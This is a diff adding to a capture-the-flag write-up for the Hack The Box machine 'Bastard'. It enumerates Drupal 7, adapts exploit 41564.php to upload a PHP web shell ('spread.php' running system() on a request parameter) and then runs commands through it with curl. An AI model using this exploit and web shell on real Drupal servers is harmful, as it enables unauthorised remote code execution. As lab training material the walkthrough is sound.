@@ -64,17 +64,86 @@ You can read the version on nmap or also runngin the command:
 curl -s http://bastard.htb/CHANGELOG.txt | grep -m2 ""
 ```
 
+Here you can read the CHANGELOG: http://bastard.htb/CHANGELOG.txt .
+Here you can read the README: http://bastard.htb/README.txt .
+
+![image](https://github.com/user-attachments/assets/bd363a40-deab-47b1-95dc-5a3b75cb61f9)
+
 Then I looking for known vulnerabilities:
 
 ```bash
 searchsploit Drupal 7
 ```
 
-![image](https://github.com/user-attachments/assets/07d958c6-e0f8-4994-9611-a9497633c627)
+I try to run several payload the only one that I successfully run was `php/webapps/41564.php`:
 
-Here you can read the CHANGELOG: http://bastard.htb/CHANGELOG.txt .
-Here you can read the README: http://bastard.htb/README.txt .
+![Screenshot from 2025-01-11 11-03-56](https://github.com/user-attachments/assets/3ed8366f-41cc-4cbd-ac4b-5376087bf787)
 
-![image](https://github.com/user-attachments/assets/bd363a40-deab-47b1-95dc-5a3b75cb61f9)
+I copied it locally by running:
 
+```bash
+searchsploit -m php/webapps/41564.php
+```
+
+There are some settings to change:
+
+* url
+* rest endpoint
+* command to execute
+
+![Screenshot from 2025-01-11 10-33-25](https://github.com/user-attachments/assets/645bf428-9c10-4d64-8a62-cdc6be4cef3a)
+
+The url we already known, we need to find out the rest endpoint, to achive it I run `ffuf` command to enumerate directories:
+
+```bash
+ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
+-u "http://bastard.htb/FUZZ"
+```
+
+I discover the `rest` folder and I test it with curl:
+
+![Screenshot from 2025-01-11 11-10-34](https://github.com/user-attachments/assets/56c6d8c5-7f7d-411f-b419-0b892aa08c47)
+
+Then I change the file settings:
+
+```php
+$url = 'http://bastard.htb';
+$endpoint_path = '/rest';
+$endpoint = 'rest_endpoint';
+
+$file = [
+	'filename' => 'spread.php',
+    'data' => '<?php system($_REQUEST["cmd"]); ?>'
+];
+```
+
+![Screenshot from 2025-01-11 10-37-37](https://github.com/user-attachments/assets/89926a8b-7320-47d5-bd45-3b53a3cf250a)
+
+To run the payload:
+
+```bash
+php 41564.php
+```
+
+But I got an error:
+
+![Screenshot from 2025-01-11 10-38-24](https://github.com/user-attachments/assets/c26142ad-52cc-4772-9a6a-69480efc13de)
+
+To fix it install the `php-curl` packet:
+
+```bash
+apt install php-curl
+```
+
+Then I run it again, it will create a new file:
+
+![Screenshot from 2025-01-11 10-43-43](https://github.com/user-attachments/assets/6b036c20-f4bd-490f-ad60-1aab8978ed82)
+
+You can test it by running:
+
+```bash
+curl "http://bastard.htb/spread.php?cmd=whoami"
+```
+
+![Screenshot from 2025-01-11 11-15-45](https://github.com/user-attachments/assets/87e6255d-b785-40bd-8a5a-73851cca01f4)
 
